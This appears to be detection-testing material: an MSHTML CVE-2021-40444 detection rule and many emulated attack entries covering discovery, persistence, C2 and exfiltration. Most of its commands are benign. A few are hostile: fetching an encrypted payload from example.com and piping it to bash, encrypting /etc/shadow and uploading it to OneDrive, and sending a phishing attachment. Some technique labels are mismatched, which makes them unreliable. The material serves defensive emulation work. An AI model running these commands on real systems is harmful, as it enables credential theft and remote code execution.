Adversaries created multiple stages to obfuscate the command-and-control channel and to make detection more difficult
The attackers used a DLL executable to download and execute a malicious payload
Malware creates a thread to monitor task execution and uploads results to OneDrive

rules.title: MSHTML Remote Code Execution Exploitation via CVE-2021-40444
rules.description: Detects process creation events indicative of exploitation of MSHTML vulnerability (CVE-2021-40444) leading to client-side code execution. Focuses on suspicious child processes launched from MSHTML-based applications with exploit-related command-line artifacts.

detection.condition: selection_mshtml_exploit and selection_suspicious_child and selection_parent_office and not exclusion_trusted_path

falsepositives: Legitimate debugging or testing activities involving MSHTML and scripting engines
Administrative scripts launched from Office applications in development environments
Authorized use of mshta or wscript with MSHTML components in enterprise applications

attacks.description: Downloads a benign executable from a URL and executes it
attacks.expected_behavior: The benign executable will be downloaded and executed

attacks.description: Downloads a benign executable from a URL and executes it using PowerShell
attacks.expected_behavior: The benign executable will be downloaded and executed

attacks.description: Creates a directory, downloads a benign executable from a URL, and executes it
attacks.expected_behavior: The directory will be created, the benign executable will be downloaded, and executed

attacks.description: Send a phishing email with the malicious HTML file attached using the mutt mail client.
attacks.expected_behavior: An email with subject 'Quarterly Report' and the malicious.html attachment is delivered to victim@example.com.

attacks.command: curl -X POST -F \"file=@$HOME/tmp/malicious.html\" https://example.com/upload && echo \"Phishing link: https://example.com/files/malicious.html\" | mutt -s \"Please review the attached report\" victim@example.com
attacks.description: Upload the malicious file to a web server and then send a phishing email containing the download link.
attacks.expected_behavior: The file is posted to the remote server, and a follow‑up email with a link to the uploaded file is sent to the target.

attacks.command: powershell -Command "Get-Process | Select-Object -Property ProcessName, Id, StartTime | ConvertTo-Json"
attacks.description: Gather information about running processes using PowerShell.
attacks.expected_behavior: This command will output a JSON object containing the names, IDs, and start times of all running processes.

attacks.description: Retrieve the .NET CLR version using PowerShell.
attacks.expected_behavior: This command will output the .NET CLR version in JSON format.

attacks.command: powershell -Command "Get-WmiObject -Class Win32_OperatingSystem | Select-Object -Property Caption, BuildNumber, Version | ConvertTo-Json"
attacks.description: Use PowerShell to gather detailed operating system information.
attacks.expected_behavior: This command will output detailed information about the operating system, including its caption, build number, and version, in JSON format.

attacks.description: List running processes using Get-Process cmdlet
attacks.expected_behavior: Lists running processes

attacks.description: Gather information about processes using Get-ChildItem cmdlet
attacks.expected_behavior: Lists information about processes

attacks.description: Start a new process using Start-Process cmdlet and gather its information
attacks.expected_behavior: Starts a new process and lists its information

attacks.description: Basic command to simulate sending a command to a web service using PowerShell.
attacks.expected_behavior: The command sends a POST request to the specified URI with the body containing the command to execute, simulating command and control communication.

attacks.description: Intermediate command using certutil to fetch a resource and PowerShell to execute a command received from the web service.
attacks.expected_behavior: The command first uses certutil to fetch a resource from the specified URI, then uses PowerShell to download and execute a string from another URI, simulating bidirectional communication.

attacks.description: Advanced command that continuously checks a web service for new commands to execute, simulating a persistent command and control channel.
attacks.expected_behavior: The command enters an infinite loop where it periodically downloads a command from the specified URI and executes it, then waits for a specified interval before checking for the next command.

attacks.description: Basic command to send a test command to a web service using curl
attacks.expected_behavior: The command sends a POST request to the specified web service with the test command as data.

attacks.description: Intermediate command to send a test command to a web service using wget
attacks.expected_behavior: The command sends a GET request to the specified web service with the test command as a query parameter and outputs the response to the console.

attacks.description: Advanced command to send a test command from a file to a web service using curl
attacks.expected_behavior: The command sends a POST request to the specified web service with the contents of the test_command.txt file as data.

attacks.description: Basic command to simulate exploitation of MSHTML vulnerability
attacks.expected_behavior: Creates a file in the temp directory to simulate exploitation

attacks.description: Intermediate command to simulate exploitation of MSHTML vulnerability using PowerShell
attacks.expected_behavior: Displays a message box to simulate exploitation

attacks.description: Advanced command to simulate exploitation of MSHTML vulnerability using certutil
attacks.expected_behavior: Downloads and executes a file from a URL to simulate exploitation

attacks.description: Basic command to download and execute a malicious payload
attacks.expected_behavior: Downloads a file and executes it

attacks.description: Intermediate command to download and execute a malicious payload using wget
attacks.expected_behavior: Downloads a file and executes it

attacks.description: Advanced command to create and execute a malicious payload
attacks.expected_behavior: Creates a file and executes it

attacks.description: Basic command to write the current date to a file in the temp directory using PowerShell.
attacks.expected_behavior: Creates a file named date.txt in the temp directory with the current date.

attacks.description: Intermediate command to compress a file using PowerShell's Compress-Archive cmdlet.
attacks.expected_behavior: Creates a zip archive of the date.txt file in the temp directory.

attacks.description: Advanced command to encode a string to Base64 using PowerShell and save it to a file.
attacks.expected_behavior: Creates a file named encoded.txt in the temp directory with the Base64 encoded string.

attacks.description: Executes a simple PowerShell one‑liner that enumerates the first five processes on the system.
attacks.expected_behavior: PowerShell starts, runs Get-Process, and prints a short list of process names and IDs to stdout.

attacks.command: pwsh -Command "$script = 'Write-Output \"Test PowerShell Execution\"'; $path = '/tmp/test_ps.ps1'; Set-Content -Path $path -Value $script -Force; pwsh -File $path; Remove-Item -Path $path -ErrorAction SilentlyContinue"
attacks.description: Writes a temporary PowerShell script to /tmp, executes it, and then cleans up the file.
attacks.expected_behavior: The script prints 'Test PowerShell Execution' to stdout; the temporary .ps1 file is removed afterwards.

attacks.description: Uses PowerShell's Compress-Archive cmdlet to archive the user's home directory into a zip file in /tmp.
attacks.expected_behavior: A zip file named home_backup.zip is created in /tmp containing the contents of the current user's home directory.

attacks.description: Attempts to read the system password file, which is only readable by root.
attacks.expected_behavior: If run as root, the file contents are printed; otherwise an access denied error is silently ignored.

attacks.description: Discover application windows by querying processes with a main window title.
attacks.expected_behavior: Lists the titles of application windows currently open on the system.

attacks.description: Create a temporary command prompt window with a specific title to simulate an application window.
attacks.expected_behavior: Opens a command prompt window titled 'TestWindow' for 5 seconds.

attacks.command: powershell -Command "$sig = New-Object System.Diagnostics.ProcessStartInfo; $sig.FileName = 'cmd'; $sig.Arguments = '/c start notepad'; $sig.UseShellExecute = $false; $sig.RedirectStandardOutput = $true; $process = New-Object System.Diagnostics.Process; $process.StartInfo = $sig; $process.Start(); $process.WaitForExit()"
attacks.description: Start Notepad as a separate process to demonstrate creating a new application window.
attacks.expected_behavior: Opens Notepad as a new application window.

attacks.description: List all windows
attacks.expected_behavior: Lists all open windows on the system.

attacks.description: Find the window ID of a Firefox window
attacks.expected_behavior: Returns the window ID of a Firefox window if found.

attacks.description: Activate the Firefox window
attacks.expected_behavior: Activates the Firefox window if it exists.

attacks.description: Gathers basic system information including OS version, hotfixes, and network configuration.
attacks.expected_behavior: Displays system information in the command prompt window.

attacks.command: powershell -Command "Get-Process | Select-Object -Property ProcessName, Id, StartTime | Sort-Object -Property StartTime"
attacks.description: Lists running processes sorted by start time, providing insight into system activity.
attacks.expected_behavior: Displays a list of running processes in the PowerShell window, sorted by their start time.

attacks.command: wmic os get Caption, CSDVersion, BuildNumber /value
attacks.description: Retrieves specific Windows OS version details, including caption, service pack version, and build number.
attacks.expected_behavior: Displays the specified OS details in the command prompt window.

attacks.description: Gathers system information including the kernel version, hostname, and operating system name.
attacks.expected_behavior: Displays system information in the terminal.

attacks.description: Lists all running processes on the system, including their ownership and resource usage.
attacks.expected_behavior: Displays a list of running processes in the terminal.

attacks.description: Displays information about the Linux distribution, including its name, version, and codename.
attacks.expected_behavior: Displays Linux distribution information in the terminal.

attacks.description: Attempt to obtain a new OAuth2 token using PowerShell with error handling for potential failures.
attacks.expected_behavior: The command attempts to get a new token, handling potential errors silently.

attacks.description: Continuously attempt to obtain a new OAuth2 token every 20 minutes using a PowerShell loop.
attacks.expected_behavior: The command runs in an infinite loop, attempting to get a new token every 20 minutes, handling potential errors silently.

attacks.command: powershell -Command "& {Add-Type -AssemblyName System.Security; $token = [System.Security.SecureString]::New(); $cred = New-Object System.Management.Automation.PSCredential('user', $token); $auth = [Microsoft.Graph.PowerShell.Authentication.GraphAuthentication]::New(); try { $auth.GetToken($cred) } catch { Write-Host 'Token acquisition failed.' } }"
attacks.description: Attempt to obtain a new OAuth2 token with try-catch block for error handling.
attacks.expected_behavior: The command attempts to get a new token and catches any exceptions, printing a failure message if token acquisition fails.

attacks.description: Simulate obtaining a new OAuth2 token using curl to mimic the authentication process.
attacks.expected_behavior: The command should send a POST request to the specified URL with the provided credentials to simulate obtaining an OAuth2 token.

attacks.command: echo 'Simulated token response' > token_response.txt; cat token_response.txt
attacks.description: Simulate the response from an OAuth2 token request and handle it locally.
attacks.expected_behavior: The command should create a file named 'token_response.txt' with the simulated token response and then display its contents.

attacks.command: while true; do curl -X POST 'https://example.com/token' -H 'Content-Type: application/x-www-form-urlencoded' -d 'grant_type=client_credentials&client_id=client123&client_secret=secret123'; sleep 20; done
attacks.description: Simulate continuously obtaining a new OAuth2 token every 20 seconds to mimic the behavior described in the technique.
attacks.expected_behavior: The command should continuously send POST requests to the specified URL to simulate obtaining new OAuth2 tokens at regular intervals.

attacks.description: Opens a decoy Excel file to lure the user into executing it
attacks.expected_behavior: The decoy Excel file will open, potentially tricking the user into executing malicious content

attacks.description: Uses PowerShell to execute Excel and open the decoy file
attacks.expected_behavior: The decoy Excel file will open via PowerShell, demonstrating user execution

attacks.description: Uses certutil to download and execute a file from the temp directory
attacks.expected_behavior: The decoy file will be downloaded and executed, demonstrating user execution with potential for malicious activity

attacks.description: Opens a decoy PDF file from a website, simulating user execution of a potentially malicious file.
attacks.expected_behavior: The default PDF viewer will open the decoy PDF file from the specified URL.

attacks.command: bash -c 'echo "This is a benign message" > /tmp/decoy.txt; xdg-open /tmp/decoy.txt'
attacks.description: Creates a benign text file and opens it, simulating user execution of a potentially malicious script.
attacks.expected_behavior: A text file named decoy.txt will be created in /tmp, and the default text editor will open it, displaying the benign message.

attacks.description: Downloads a script from a URL and executes it, simulating user execution of a potentially malicious script. **Note:** This command is for testing purposes only and should not be used with untrusted URLs or scripts.
attacks.expected_behavior: The script decoy.sh will be downloaded from the specified URL and executed by bash. **Caution:** This could potentially execute malicious code if the URL or script is not trusted.

attacks.description: Basic reflective code loading using rundll32.exe to load a test DLL into memory and execute its EntryPoint function.
attacks.expected_behavior: The test.dll is loaded into memory, and its EntryPoint function is executed without any visible signs of malicious activity.

attacks.description: Intermediate reflective code loading using regsvr32.exe to silently load and register a test DLL, then execute its code.
attacks.expected_behavior: The test.dll is loaded and registered, then its code is executed. This method is stealthier than the basic example but still safe for testing purposes.

attacks.description: Advanced reflective code loading using PowerShell to load the Microsoft.VisualBasic assembly and then use its Interaction.Shell method to execute cmd.exe, which in turn loads and executes a test DLL using rundll32.exe.
attacks.expected_behavior: The test.dll is loaded and executed through a chain of commands initiated by PowerShell, demonstrating a more complex reflective code loading scenario.

attacks.description: Basic example of reflective code loading using ld to load a shared object file.
attacks.expected_behavior: Loads a shared object file into memory using ld, potentially allowing for the execution of malicious code without direct execution.

attacks.description: Intermediate example compiling a C file into a shared object and then loading it reflectively.
attacks.expected_behavior: Compiles a C file into a shared object and loads it into memory, demonstrating a more complex form of reflective code loading.

attacks.description: Advanced example using msfvenom to generate a malicious payload and then loading it reflectively.
attacks.expected_behavior: Generates a malicious executable file using msfvenom and loads it into memory, showcasing a sophisticated method of reflective code loading with potential for evasion.

attacks.description: Basic multi‑stage channel: creates a named pipe and starts a netcat listener that feeds received data into a bash shell via the pipe, hiding the command‑and‑control traffic.
attacks.expected_behavior: Netcat listens on port 5555; any text sent to that port is executed by bash. The use of the pipe makes the channel less obvious in process listings.

attacks.description: Intermediate multi‑stage channel: downloads a base64‑encoded second‑stage script, decodes it to a temporary file, makes it executable, and runs it in the background.
attacks.expected_behavior: The command fetches a harmless placeholder script, decodes it, and executes it. The two‑step fetch/execute process adds an extra layer to the C2 channel.

attacks.command: socat TCP-LISTEN:6000,reuseaddr,fork EXEC:'openssl enc -d -aes-256-cbc -K 0123456789abcdef0123456789abcdef -iv 0123456789abcdef',pty,stderr,setsid,sigint,sane & curl -s http://example.com/enc_payload.bin | openssl enc -d -aes-256-cbc -K 0123456789abcdef0123456789abcdef -iv 0123456789abcdef | bash
attacks.description: Advanced multi‑stage channel: sets up a socat listener that decrypts incoming traffic with OpenSSL, then uses curl to fetch an encrypted payload, decrypts it, and pipes it to bash, chaining two encrypted stages.
attacks.expected_behavior: A socat process listens on port 6000, decrypting any data it receives before passing it to a pseudo‑terminal. Simultaneously, curl retrieves an encrypted binary, which is decrypted and executed, demonstrating layered, encrypted C2 communication.

attacks.description: Basic: Download a file using certutil and execute it using cmd
attacks.expected_behavior: Downloads a file and executes it

attacks.description: Intermediate: Download and execute a PowerShell script
attacks.expected_behavior: Downloads a PowerShell script and executes it

attacks.description: Advanced: Download and execute an executable using WebClient
attacks.expected_behavior: Downloads an executable and runs it, potentially requiring admin privileges

attacks.description: Basic command to execute a script that writes to a file
attacks.expected_behavior: Creates a file /tmp/test.txt with the content 'Hello World'

attacks.description: Intermediate command to execute a Python script that runs a system command
attacks.expected_behavior: Executes the ls -l command and displays the output

attacks.description: Advanced command to download and execute a script from a remote location
attacks.expected_behavior: Downloads a script from http://example.com/script.sh and executes it using bash

attacks.technique_name: Event Triggered Execution: Component Object Model Hijacking
attacks.description: Basic command to register a malicious COM object using regsvr32.exe
attacks.expected_behavior: The malicious COM object will be registered and potentially executed by the system

attacks.technique_name: Event Triggered Execution: Component Object Model Hijacking
attacks.description: Intermediate command to execute a malicious COM object using PowerShell
attacks.expected_behavior: The malicious COM object will be executed by the system

attacks.technique_name: Event Triggered Execution: Component Object Model Hijacking
attacks.description: Advanced command to register a malicious COM object using reg.exe
attacks.expected_behavior: The malicious COM object will be registered and potentially executed by the system

attacks.technique_name: Event Triggered Execution: Component Object Model Hijacking
attacks.description: Simulate hijacking by creating a symbolic link to a malicious executable, assuming the target executable is frequently used and its path is in the system's PATH environment variable.
attacks.expected_behavior: When the target executable is run, the malicious executable will be executed instead, demonstrating the hijacking technique.

attacks.technique_name: Event Triggered Execution: Component Object Model Hijacking
attacks.description: Add malicious code to the user's bashrc file, which will be executed every time the user logs in or opens a new terminal, simulating persistence through hijacking of the user's shell configuration.
attacks.expected_behavior: The malicious code will be executed when the user logs in or opens a new terminal, demonstrating persistence.

attacks.technique_name: Event Triggered Execution: Component Object Model Hijacking
attacks.description: Create a desktop entry in the autostart directory to execute a malicious file on startup, simulating the hijacking of application startup.
attacks.expected_behavior: The malicious executable will be run when the user logs in, demonstrating the hijacking technique for persistence.

attacks.description: Encode a message using certutil.exe to demonstrate symmetric cryptography for command and control traffic
attacks.expected_behavior: The command will encode the message in message.txt and save it as encoded_message.txt in the temp directory.

attacks.description: Use PowerShell to encode a string to Base64, demonstrating symmetric cryptography principles
attacks.expected_behavior: The command will output the Base64 encoded string of 'Hello, World!'

attacks.description: Decode a previously encoded message using certutil.exe to demonstrate command and control traffic decryption
attacks.expected_behavior: The command will decode the encoded message and save it as decoded_message.txt in the temp directory.

attacks.description: Basic symmetric encryption using AES-256-CBC
attacks.expected_behavior: Encrypts the contents of plaintext.txt using AES-256-CBC and saves it to encrypted.txt

attacks.command: openssl enc -aes-256-cbc -in plaintext.txt -out encrypted.txt -pass pass:password123 -md sha256 -salt
attacks.description: Intermediate symmetric encryption using AES-256-CBC with SHA-256 hashing and salting
attacks.expected_behavior: Encrypts the contents of plaintext.txt using AES-256-CBC with SHA-256 hashing and salting, and saves it to encrypted.txt

attacks.command: python -c 'from cryptography.fernet import Fernet; key = Fernet.generate_key(); cipher = Fernet(key); ciphertext = cipher.encrypt(b"Hello, World!"); print(ciphertext)'
attacks.description: Advanced symmetric encryption using a custom Python script with Fernet
attacks.expected_behavior: Generates a key, encrypts the string 'Hello, World!' using Fernet, and prints the ciphertext

attacks.command: openssl genrsa -out private_key.pem 2048; openssl rsa -in private_key.pem -pubout -out public_key.pem; openssl rsautl -encrypt -inkey public_key.pem -pubin -in message.txt -out encrypted.txt
attacks.description: Generate RSA keys and encrypt a message
attacks.expected_behavior: A public and private key pair will be generated, and a message will be encrypted using the public key.

attacks.command: openssl ecparam -genkey -name secp256r1 -out private_key.pem; openssl ec -in private_key.pem -pubout -out public_key.pem; openssl pkeyutl -encrypt -inkey public_key.pem -pubin -in message.txt -out encrypted.txt
attacks.description: Generate ECC keys and encrypt a message
attacks.expected_behavior: A public and private key pair will be generated using ECC, and a message will be encrypted using the public key.

attacks.command: openssl s_server -accept 443 -cert public_key.pem -key private_key.pem; openssl s_client -connect localhost:443 -cert public_key.pem -key private_key.pem
attacks.description: Establish a secure communication channel using SSL/TLS
attacks.expected_behavior: A secure communication channel will be established between the server and client using SSL/TLS.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.description: Encode a file using certutil.exe for exfiltration
attacks.expected_behavior: The command encodes the content of test.txt into a new file in the %TEMP% directory, demonstrating the initial step of preparing data for exfiltration.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.description: Create a file, add content, and read it back using PowerShell
attacks.expected_behavior: This command creates a new file in the %TEMP% directory, adds a benign test string to it, and then reads the content back, simulating the exfiltration of data over a command and control channel.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.description: Download a file from an internal server using PowerShell
attacks.expected_behavior: This command downloads content from a hypothetical internal server and saves it to a file in the %TEMP% directory, demonstrating the exfiltration of data over a command and control channel. Note: This command assumes the existence of an internal server for testing purposes.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.description: Basic exfiltration of /etc/passwd using netcat
attacks.expected_behavior: The contents of /etc/passwd are sent to the attacker's IP on port 4444

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.description: Intermediate exfiltration example, compressing /etc/passwd before sending
attacks.expected_behavior: The compressed contents of /etc/passwd are sent to the attacker's IP on port 4444

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.description: Advanced exfiltration using AES encryption before sending
attacks.expected_behavior: The encrypted contents of /etc/passwd are sent to the attacker's IP on port 4444, then the local encrypted file is removed

attacks.description: Downloads a benign file using certutil and executes it.
attacks.expected_behavior: The benign file will be downloaded to the temp directory and then executed.

attacks.description: Downloads a benign file using PowerShell and executes it.
attacks.expected_behavior: The benign file will be downloaded to the temp directory and then executed using PowerShell.

attacks.command: cmd.exe /c echo This is a benign file > %TEMP%\benignfile.txt && notepad.exe %TEMP%\benignfile.txt
attacks.description: Creates a benign text file and opens it with Notepad, simulating a non-executable attachment.
attacks.expected_behavior: A text file will be created in the temp directory and opened with Notepad.

attacks.command: echo 'Malicious script content' > malicious_script.sh; chmod +x malicious_script.sh
attacks.description: Creates a malicious script file named malicious_script.sh, adds executable permissions, and assumes the content is a simple script that could be harmful if executed.
attacks.expected_behavior: A new file named malicious_script.sh will be created in the current directory with executable permissions, containing the specified malicious content.

attacks.command: cat > malicious_attachment.txt; echo 'This is a test malicious attachment content'; cat << EOF >> malicious_attachment.txt; This is another line of content; EOF
attacks.description: Creates a file named malicious_attachment.txt and adds content to it. The content is benign but represents what could be a malicious attachment sent via email.
attacks.expected_behavior: A new file named malicious_attachment.txt will be created in the current directory containing the specified content.

attacks.description: Generates a random binary file named random_malicious_file.bin, which could mimic a malicious attachment sent via email. The file content is random and benign.
attacks.expected_behavior: A new binary file named random_malicious_file.bin will be created in the current directory with random content.

attacks.description: Collects basic system information and copies the resulting file into the user's OneDrive sync folder, causing it to be uploaded to OneDrive.
attacks.expected_behavior: Creates sysinfo.txt in the temp directory and copies it to the OneDrive folder; the OneDrive client will then sync the file to the cloud.

attacks.description: Compresses all .txt files in the temp directory into a zip archive and uploads the archive to a web service (placeholder URL) using an HTTP PUT request, simulating exfiltration via a web service.
attacks.expected_behavior: Creates data.zip containing temp text files and sends it to the specified URL; no actual data is leaked because the URL is a dummy endpoint.

attacks.command: powershell -Command "$file='%TEMP%\\exfil.txt'; Set-Content -Path $file -Value 'dummy exfil data'; $uri='https://example.com/onedrive/upload'; $headers=@{Authorization='Bearer dummy_token'}; $bytes=Get-Content -Path $file -Encoding Byte -Raw; Invoke-RestMethod -Uri $uri -Method Put -Headers $headers -Body $bytes"
attacks.description: Creates a test file, reads its raw bytes, and uploads those bytes to a mock OneDrive Graph API endpoint using Invoke‑RestMethod, representing a realistic API‑based exfiltration.
attacks.expected_behavior: Writes a small text file, reads it as binary data, and performs an HTTP PUT to the placeholder endpoint; the request succeeds against the dummy URL without affecting real services.

attacks.description: Uploads a simple text file containing system information to the attacker’s OneDrive account using the Microsoft Graph API.
attacks.expected_behavior: The file 'info.txt' appears in the OneDrive root folder of the account associated with the supplied access token.

attacks.command: echo -e "$(uname -a)\n$(lsb_release -a 2>/dev/null)" > "$HOME/sysinfo.txt" && tar -czf "$HOME/sysinfo.tar.gz" -C "$HOME" sysinfo.txt && curl -H "Authorization: Bearer PLACEHOLDER_ACCESS_TOKEN" -X PUT -T "$HOME/sysinfo.tar.gz" "https://graph.microsoft.com/v1.0/me/drive/root:/sysinfo.tar.gz:/content"
attacks.description: Collects detailed OS information, compresses it into an archive, and uploads the archive to OneDrive.
attacks.expected_behavior: A compressed archive 'sysinfo.tar.gz' is created in the user’s home directory and then uploaded; the archive becomes visible in OneDrive.

attacks.command: if [ "$(id -u)" -ne 0 ]; then echo "Requires root"; exit 1; fi; openssl enc -aes-256-cbc -salt -in /etc/shadow -out "$HOME/shadow.enc" -k "TempPass123" && curl -H "Authorization: Bearer PLACEHOLDER_ACCESS_TOKEN" -X PUT -T "$HOME/shadow.enc" "https://graph.microsoft.com/v1.0/me/drive/root:/shadow.enc:/content" &
attacks.description: Reads the privileged /etc/shadow file, encrypts it with OpenSSL, and uploads the encrypted blob to OneDrive in a background process.
attacks.expected_behavior: When run as root, the encrypted file 'shadow.enc' is created and uploaded; the upload runs asynchronously, leaving the shell prompt available.

attacks.description: Basic: Exploit a vulnerability in Microsoft Word to open a potentially malicious document
attacks.expected_behavior: Microsoft Word opens a document from the temp directory, potentially executing malicious code embedded within the document.

attacks.description: Intermediate: Use the command line to open a potentially malicious Excel file, exploiting a vulnerability for code execution
attacks.expected_behavior: Microsoft Excel opens an Excel file from the temp directory, potentially executing malicious macros or code embedded within the file.

attacks.description: Advanced: Utilize PowerShell's Invoke-Item cmdlet to open a potentially malicious PowerPoint file, exploiting a vulnerability for code execution
attacks.expected_behavior: PowerPoint opens a presentation file from the temp directory, potentially executing malicious code or macros embedded within the presentation.

attacks.description: Download a test DOC file and open it with LibreOffice in normal mode, which would trigger any embedded exploit during document parsing.
attacks.expected_behavior: LibreOffice launches, parses the DOC file, and if the file contains a vulnerable macro or exploit, the payload is executed in the user context.

attacks.description: Download a test DOC file and open it using the default desktop handler (usually LibreOffice or OpenOffice), simulating a user double‑clicking a malicious document.
attacks.expected_behavior: The system’s default application for .doc files opens the document; any exploit embedded in the file may execute with the current user’s privileges.

attacks.description: Download a test DOC file and open it with the Windows Microsoft Word binary running under Wine, emulating a scenario where a Linux host runs Office via Wine and a vulnerability is triggered.
attacks.expected_behavior: Wine launches WINWORD.EXE, loads the malicious DOC file, and any Office‑specific exploit is executed inside the Wine environment, potentially affecting the host user.

attacks.description: Start the DNS service to simulate setting up domain infrastructure
attacks.expected_behavior: The DNS service starts, indicating potential preparation for domain setup.

attacks.description: Add a primary DNS zone using PowerShell to simulate domain acquisition
attacks.expected_behavior: A new DNS zone is added, simulating the acquisition of a domain for C2 operations.

attacks.description: Use certutil to download a file, simulating the retrieval of a malicious payload over a newly acquired domain
attacks.expected_behavior: A file is downloaded from the specified URL to the temporary directory, simulating the retrieval of malicious software over the acquired domain infrastructure.

attacks.description: Query the DNS records for a test domain to simulate reconnaissance
attacks.expected_behavior: The command should return the name servers associated with the domain, demonstrating how an attacker might gather information about a target domain's DNS setup.

attacks.description: Modify the hosts file to simulate setting up a domain for command and control, requires root privileges
attacks.expected_behavior: The command adds a DNS record to the local hosts file, redirecting example.com to a specified IP address, simulating how an attacker might set up a command and control server.

attacks.description: Use curl to test connectivity to a domain, simulating a check for the domain's availability
attacks.expected_behavior: The command checks if the domain is reachable without displaying the output, demonstrating how an attacker might verify if a command and control server is online.

attacks.description: Create a new local account with the username 'testaccount' and password 'TestPassword123!'.
attacks.expected_behavior: A new local account will be created with the specified username and password.

attacks.description: Create a new local account with the username 'testaccount' and password 'TestPassword123!' using PowerShell.
attacks.expected_behavior: A new local account will be created with the specified username and password.

attacks.description: Delete the local account with the username 'testaccount'.
attacks.expected_behavior: The local account with the username 'testaccount' will be deleted.

attacks.description: Create a new local user account with default settings
attacks.expected_behavior: A new local user account named 'testuser' is created with default settings

attacks.description: Create a new local user account with a custom shell
attacks.expected_behavior: A new local user account named 'testuser' is created with the bash shell

attacks.description: Create a new local user account and add it to the sudo group
attacks.expected_behavior: A new local user account named 'testuser' is created and added to the sudo group, granting it elevated privileges

attacks.description: Downloads a hypothetical tool from a URL to the temp directory using certutil, simulating the acquisition of a red teaming tool.
attacks.expected_behavior: The command downloads the file to the temp directory without executing it, demonstrating how a red team might acquire tools.

attacks.description: Creates a PowerShell script in the temp directory, simulating the development of a custom tool.
attacks.expected_behavior: A new PowerShell script is created in the temp directory, which can then be executed to demonstrate tool usage.

attacks.description: Simulates the execution of a tool by creating a log file in the temp directory.
attacks.expected_behavior: A log file is created in the temp directory, indicating the tool has run, allowing for the testing of detection rules against tool execution.

attacks.description: Basic example of creating and executing a simple script as a custom tool.
attacks.expected_behavior: Creates a simple script, makes it executable, and runs it, printing 'Hello World' to the terminal.

attacks.command:
cat > custom_tool.py << EOF
print('Custom tool executed')
EOF; python3 custom_tool.py
attacks.description: Intermediate example of creating and executing a Python script as a custom tool.
attacks.expected_behavior: Creates a Python script, then executes it using the python3 interpreter, printing 'Custom tool executed' to the terminal.

attacks.command: mkdir custom_tool_dir; echo 'Custom tool development directory created' > custom_tool_dir/README.md
attacks.description: Advanced example of setting up a development environment for a custom tool, including creating a directory and a README file.
attacks.expected_behavior: Creates a new directory named 'custom_tool_dir' and a README.md file within it, containing the text 'Custom tool development directory created'.

attacks.description: Create a new service named TestService using sc.exe
attacks.expected_behavior: A new service named TestService will be created and visible in the services list.

attacks.description: Start the newly created TestService using net.exe
attacks.expected_behavior: The TestService service will be started, and its status can be verified using the services manager or net.exe.

attacks.description: Stop any service whose name starts with 'Test' using PowerShell
attacks.expected_behavior: Any service whose name starts with 'Test' will be stopped. This command has a higher safety risk due to its potential to stop unintended services.

attacks.description: Start a test service using systemd
attacks.expected_behavior: The test service will be started if it exists.

attacks.description: Open the cron table for editing to add a new scheduled task
attacks.expected_behavior: The default editor will open with the cron table, allowing for the addition of new tasks.

attacks.description: Apply changes to the sysctl configuration
attacks.expected_behavior: The sysctl configuration will be reloaded, applying any changes made to the configuration file.

attacks.description: Decoding a potentially malicious file using certutil, a built-in Windows tool.
attacks.expected_behavior: The command decodes a file named test.txt in the temp directory and saves it as test.exe, which could be a malicious executable.

attacks.description: Extracting contents from a zip archive using PowerShell, potentially containing malicious components.
attacks.expected_behavior: The command extracts the contents of archive.zip in the temp directory to a folder named extracted, which could contain malicious files.

attacks.description: Creating a hidden file in the temp directory, potentially used to store malicious data.
attacks.expected_behavior: The command creates a file named test_file.txt in the temp directory, writes 'test_string' to it, and then hides the file.

attacks.description: Create a file named 'malware.txt' with suspicious content and change its permissions to executable.
attacks.expected_behavior: A file named 'malware.txt' is created in the current directory with the specified content and executable permissions.

attacks.command: touch malicious_script.sh; echo '#!/bin/bash' >> malicious_script.sh; echo 'echo Malicious Script Executed' >> malicious_script.sh; chmod 755 malicious_script.sh
attacks.description: Create a script file named 'malicious_script.sh', add a shebang line and a command to print 'Malicious Script Executed', then make the script executable.
attacks.expected_behavior: A script file 'malicious_script.sh' is created, and when executed, it prints 'Malicious Script Executed' to the console.

attacks.command: mkdir -p ~/malware_dev; touch ~/malware_dev/malware_code.c; echo '#include <stdio.h>' >> ~/malware_dev/malware_code.c; echo 'int main() { printf("Malicious Code\n"); return 0; }' >> ~/malware_dev/malware_code.c
attacks.description: Create a directory 'malware_dev' in the user's home directory, then create a C source file 'malware_code.c' within it, adding basic C code that prints 'Malicious Code' when compiled and run.
attacks.expected_behavior: A directory 'malware_dev' and a file 'malware_code.c' are created. The C code, when compiled and executed, prints 'Malicious Code' to the console.

attacks.description: Encode a file using certutil to obfuscate its contents
attacks.expected_behavior: The file test.txt will be encoded and saved as encoded.txt in the temp directory

attacks.description: Create an obfuscated script using PowerShell
attacks.expected_behavior: A file named obfuscated.txt will be created in the temp directory with the obfuscated string

attacks.description: Compress a file to further obfuscate its contents
attacks.expected_behavior: The file test.txt will be compressed into an archive named obfuscated.zip in the temp directory

attacks.description: Creates a temporary script containing a base64‑encoded harmless echo command, decodes it, makes it executable, and runs it.
attacks.expected_behavior: The script prints "Hello world!" to stdout.

attacks.description: Writes a hex‑encoded bash script to a file, decodes it with xxd, marks it executable, and runs it.
attacks.expected_behavior: The script prints "Hello hex!" to stdout.

attacks.command:
cat <<'EOF' > /tmp/adv_obf.sh
#!/bin/bash
payload='ZWNobyAiQWR2YW5jZWQi'
eval "$(echo \"$payload\" | base64 -d)"
EOF
chmod +x /tmp/adv_obf.sh && /tmp/adv_obf.sh
attacks.description: Creates a script via a heredoc that stores a base64‑encoded payload, decodes it at runtime, and executes the decoded command.
attacks.expected_behavior: The script prints "Advanced" to stdout.

attacks.description: View all active connections to discover network services
attacks.expected_behavior: Displays all active connections, including the protocol, local address, foreign address, and state.

attacks.description: Display all current TCP/IP network configuration values to discover network services
attacks.expected_behavior: Displays detailed information about the TCP/IP configuration of the network, including IP addresses, subnet masks, and default gateways.

attacks.description: Query for listening ports to discover network services using PowerShell
attacks.expected_behavior: Lists all TCP connections that are in the listening state, indicating which network services are currently available and listening for incoming connections.

attacks.description: Basic scan for open TCP ports on localhost
attacks.expected_behavior: Lists open TCP ports on the local machine

attacks.description: Intermediate command to list all listening TCP ports and the programs using them
attacks.expected_behavior: Displays all listening TCP ports and associated programs

attacks.description: Advanced scan for open UDP ports on localhost
attacks.expected_behavior: Lists open UDP ports on the local machine, which can be more complex due to UDP's connectionless nature

